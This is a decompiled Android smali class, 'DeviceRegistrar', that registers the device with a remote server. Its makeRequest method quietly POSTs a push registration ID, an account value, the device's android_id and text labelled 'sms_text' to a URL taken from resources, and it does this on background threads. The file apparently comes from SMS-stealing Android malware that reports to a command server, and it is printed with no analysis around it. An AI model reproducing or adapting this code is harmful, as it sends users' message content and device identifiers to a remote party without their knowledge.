.class public Lcom/software/application/DeviceRegistrar;
.super Ljava/lang/Object;
.source "DeviceRegistrar.java"


# static fields
.field public static final AUTH_ERROR_STATUS:I = 0x2

.field public static final ERROR_STATUS:I = 0x4

.field public static final REGISTERED_STATUS:I = 0x1

.field public static final STATUS_EXTRA:Ljava/lang/String; = "Status"

.field public static final UNREGISTERED_STATUS:I = 0x3

.field public static final UPDATE_UI:Ljava/lang/String; = "UPDATE_UI"


# direct methods
.method public constructor <init>()V
    .locals 0

    .prologue
    .line 19
    invoke-direct {p0}, Ljava/lang/Object;-><init>()V

    return-void
.end method

.method static synthetic access$0(Landroid/content/Context;Ljava/lang/String;Ljava/lang/String;)Lorg/apache/http/HttpResponse;
    .locals 1
    .annotation system Ldalvik/annotation/Throws;
        value = {
            Ljava/lang/Exception;
        }
    .end annotation

    .prologue
    .line 74
    invoke-static {p0, p1, p2}, Lcom/software/application/DeviceRegistrar;->makeRequest(Landroid/content/Context;Ljava/lang/String;Ljava/lang/String;)Lorg/apache/http/HttpResponse;

    move-result-object v0

    return-object v0
.end method

.method private static makeRequest(Landroid/content/Context;Ljava/lang/String;Ljava/lang/String;)Lorg/apache/http/HttpResponse;
    .locals 7
    .param p0, "context"    # Landroid/content/Context;
    .param p1, "registrationID"    # Ljava/lang/String;
    .param p2, "url"    # Ljava/lang/String;
    .annotation system Ldalvik/annotation/Throws;
        value = {
            Ljava/lang/Exception;
        }
    .end annotation

    .prologue
    .line 76
    new-instance v0, Lorg/apache/http/impl/client/DefaultHttpClient;

    invoke-direct {v0}, Lorg/apache/http/impl/client/DefaultHttpClient;-><init>()V

    .line 77
    .local v0, "client":Lorg/apache/http/client/HttpClient;
    new-instance v2, Lorg/apache/http/client/methods/HttpPost;

    invoke-direct {v2, p2}, Lorg/apache/http/client/methods/HttpPost;-><init>(Ljava/lang/String;)V

    .line 78
    .local v2, "post":Lorg/apache/http/client/methods/HttpPost;
    new-instance v1, Ljava/util/ArrayList;

    invoke-direct {v1}, Ljava/util/ArrayList;-><init>()V

    .line 79
    .local v1, "nameValuePairs":Ljava/util/List;, "Ljava/util/List<Lorg/apache/http/NameValuePair;>;"
    new-instance v3, Lorg/apache/http/message/BasicNameValuePair;

    const-string v4, "registrationid"

    invoke-direct {v3, v4, p1}, Lorg/apache/http/message/BasicNameValuePair;-><init>(Ljava/lang/String;Ljava/lang/String;)V

    invoke-interface {v1, v3}, Ljava/util/List;->add(Ljava/lang/Object;)Z

    .line 80
    const v3, 0x7f070013

    invoke-virtual {p0, v3}, Landroid/content/Context;->getString(I)Ljava/lang/String;

    move-result-object v3

    invoke-virtual {p2, v3}, Ljava/lang/String;->equals(Ljava/lang/Object;)Z

    move-result v3

    if-nez v3, :cond_0

    .line 81
    new-instance v3, Lorg/apache/http/message/BasicNameValuePair;

    const-string v4, "account"

    const v5, 0x7f070011

    invoke-virtual {p0, v5}, Landroid/content/Context;->getString(I)Ljava/lang/String;

    move-result-object v5

    invoke-direct {v3, v4, v5}, Lorg/apache/http/message/BasicNameValuePair;-><init>(Ljava/lang/String;Ljava/lang/String;)V

    invoke-interface {v1, v3}, Ljava/util/List;->add(Ljava/lang/Object;)Z

    .line 82
    new-instance v3, Lorg/apache/http/message/BasicNameValuePair;

    const-string v4, "device_id"

    invoke-virtual {p0}, Landroid/content/Context;->getContentResolver()Landroid/content/ContentResolver;

    move-result-object v5

    const-string v6, "android_id"

    invoke-static {v5, v6}, Landroid/provider/Settings$Secure;->getString(Landroid/content/ContentResolver;Ljava/lang/String;)Ljava/lang/String;

    move-result-object v5

    invoke-direct {v3, v4, v5}, Lorg/apache/http/message/BasicNameValuePair;-><init>(Ljava/lang/String;Ljava/lang/String;)V

    invoke-interface {v1, v3}, Ljava/util/List;->add(Ljava/lang/Object;)Z

    .line 83
    new-instance v3, Lorg/apache/http/message/BasicNameValuePair;

    const-string v4, "sms_text"

    const/4 v5, 0x5

    invoke-static {v5, p0}, Lcom/software/application/TextUtils;->readLine(ILandroid/content/Context;)Ljava/lang/String;

    move-result-object v5

    invoke-direct {v3, v4, v5}, Lorg/apache/http/message/BasicNameValuePair;-><init>(Ljava/lang/String;Ljava/lang/String;)V

    invoke-interface {v1, v3}, Ljava/util/List;->add(Ljava/lang/Object;)Z

    .line 85
    :cond_0
    new-instance v3, Lorg/apache/http/client/entity/UrlEncodedFormEntity;

    invoke-direct {v3, v1}, Lorg/apache/http/client/entity/UrlEncodedFormEntity;-><init>(Ljava/util/List;)V

    invoke-virtual {v2, v3}, Lorg/apache/http/client/methods/HttpPost;->setEntity(Lorg/apache/http/HttpEntity;)V

    .line 86
    invoke-interface {v0, v2}, Lorg/apache/http/client/HttpClient;->execute(Lorg/apache/http/client/methods/HttpUriRequest;)Lorg/apache/http/HttpResponse;

    move-result-object v3

    return-object v3
.end method

.method public static registerToServer(Landroid/content/Context;Ljava/lang/String;)V
    .locals 2
    .param p0, "context"    # Landroid/content/Context;
    .param p1, "registrationID"    # Ljava/lang/String;

    .prologue
    .line 29
    new-instance v0, Ljava/lang/Thread;

    new-instance v1, Lcom/software/application/DeviceRegistrar$1;

    invoke-direct {v1, p0, p1}, Lcom/software/application/DeviceRegistrar$1;-><init>(Landroid/content/Context;Ljava/lang/String;)V

    invoke-direct {v0, v1}, Ljava/lang/Thread;-><init>(Ljava/lang/Runnable;)V

    .line 49
    invoke-virtual {v0}, Ljava/lang/Thread;->start()V

    .line 50
    return-void
.end method

.method public static unregisterToServer(Landroid/content/Context;Ljava/lang/String;)V
    .locals 2
    .param p0, "context"    # Landroid/content/Context;
    .param p1, "registrationID"    # Ljava/lang/String;

    .prologue
    .line 53
    new-instance v0, Ljava/lang/Thread;

    new-instance v1, Lcom/software/application/DeviceRegistrar$2;

    invoke-direct {v1, p0, p1}, Lcom/software/application/DeviceRegistrar$2;-><init>(Landroid/content/Context;Ljava/lang/String;)V

    invoke-direct {v0, v1}, Ljava/lang/Thread;-><init>(Ljava/lang/Runnable;)V

    .line 71
    invoke-virtual {v0}, Ljava/lang/Thread;->start()V

    .line 72
    return-void
.end method
